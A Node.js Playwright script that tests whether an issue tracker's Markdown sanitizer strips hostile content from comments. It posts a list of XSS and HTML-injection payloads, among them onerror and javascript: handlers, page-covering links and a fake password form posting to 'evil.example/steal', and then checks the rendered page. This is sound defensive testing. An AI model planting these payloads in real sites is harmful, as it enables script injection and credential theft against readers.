// Record text renders as formatting only: no script, no forms, nothing covering the page, nothing
// fetched from another host. A real browser is the only honest check of a sanitizer.
// Usage: node scripts/check-markdown.mjs <port> <user> <pass> (signs in; adds comments to the first issue)
import { chromium } from '@playwright/test';
import http from 'node:http';

const [port, user, pass] = process.argv.slice(2);
const origin = `http://localhost:${port}`;

const hits = [];
const outside = http.createServer((req, res) => {
	hits.push(req.url);
	res.setHeader('content-type', 'image/png');
	res.end();
});
await new Promise((ok) => outside.listen(0, '127.0.0.1', ok));
const elsewhere = `http://127.0.0.1:${outside.address().port}`;

const payloads = [
	'<img src=x title="<img onerror=window.__pwned=1 x=1>">',
	'<img src=x onerror="window.__pwned=1"><svg onload="window.__pwned=1"></svg><script>window.__pwned=1</script>',
	'<a id=js href="javascript:window.__pwned=1">x</a>',
	'<form action="https://evil.example/steal" method=post><input name=password type=password><button>Sign in</button></form>',
	'<style>body{outline:7px solid red}</style>',
	'<a id=over href="https://evil.example/" style="position:fixed;inset:0">styled</a>',
	'<a id=cls href="https://evil.example/" class="fixed inset-0 z-50">classed</a>',
	`![beacon](${elsewhere}/beacon.png)`,
	`<video src="${elsewhere}/v.mp4"></video><img src="/x.png" srcset="${elsewhere}/s.png 2x">`,
	`<iframe src="${elsewhere}/frame"></iframe>`,
	'- [x] done item\n\n**bold** [ok](https://example.test/)\n\n```js\nlet a;\n```',
	'![local](/api/blobs/none)'
];

const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto(`${origin}/login`);
const api = (method, path, body) =>
	page.evaluate(
		async ([m, p, b]) => {
			const r = await fetch(`/api${p}`, {
				method: m,
				headers: { 'content-type': 'application/json' },
				body: b ? JSON.stringify(b) : undefined
			});
			return { status: r.status, json: await r.json().catch(() => null) };
		},
		[method, path, body]
	);
if ((await api('POST', '/auth/login', { username: user, password: pass })).status !== 200)
	throw new Error('sign-in failed');
const issue = (await api('GET', '/issues?limit=1')).json.items[0];
for (const body of payloads) {
	const r = await api('POST', `/issues/${issue.id}/comments`, { body });
	if (r.status >= 300) throw new Error(`comment refused: ${JSON.stringify(r.json)}`);
}
await page.goto(`${origin}/issues/${issue.id}`);
await page.waitForSelector('.prose-opal');
await page.waitForTimeout(1500);

const seen = await page.evaluate(() => {
	const prose = [...document.querySelectorAll('.prose-opal')];
	const all = (sel) => prose.flatMap((p) => [...p.querySelectorAll(sel)]);
	return {
		pwned: window.__pwned ?? null,
		forms: all('form, button, textarea, select, input[type=password]').length,
		styles: all('style, [style]').length,
		classed: all('a[class], p[class], div[class]').length,
		fixed: all('*').filter((e) => getComputedStyle(e).position === 'fixed').length,
		jsLinks: all('a').filter((a) => (a.getAttribute('href') ?? '').startsWith('javascript')).length,
		frames: all('iframe, video, source').length,
		srcset: all('[srcset]').length,
		outsideImages: all('img').filter(
			(i) => !(i.getAttribute('src') ?? '').startsWith('/') && i.getAttribute('src') !== 'x'
		).length,
		beaconLink: all('a').some((a) => a.textContent === 'beacon' && a.href.endsWith('/beacon.png')),
		checkbox: all('input[type=checkbox][disabled]').length,
		bold: all('strong').length,
		codeLanguage: all('code.language-js').length,
		localImage: all('img[src="/api/blobs/none"][loading=lazy]').length,
		safeLink: all('a[href="https://example.test/"][rel="noopener noreferrer"]').length
	};
});
await browser.close();
outside.close();

const want = {
	pwned: null,
	forms: 0,
	styles: 0,
	classed: 0,
	fixed: 0,
	jsLinks: 0,
	frames: 0,
	srcset: 0,
	outsideImages: 0,
	beaconLink: true
};
const problems = Object.entries(want)
	.filter(([k, v]) => seen[k] !== v)
	.map(([k, v]) => `${k}: expected ${v}, got ${seen[k]}`);
for (const k of ['checkbox', 'bold', 'codeLanguage', 'localImage', 'safeLink'])
	if (!seen[k]) problems.push(`${k}: formatting was lost`);
if (hits.length) problems.push(`the reader's browser called another host: ${hits.join(', ')}`);
console.log(seen);
if (problems.length) {
	console.error(problems.join('\n'));
	process.exit(1);
}
console.log('Record text renders as formatting only.');
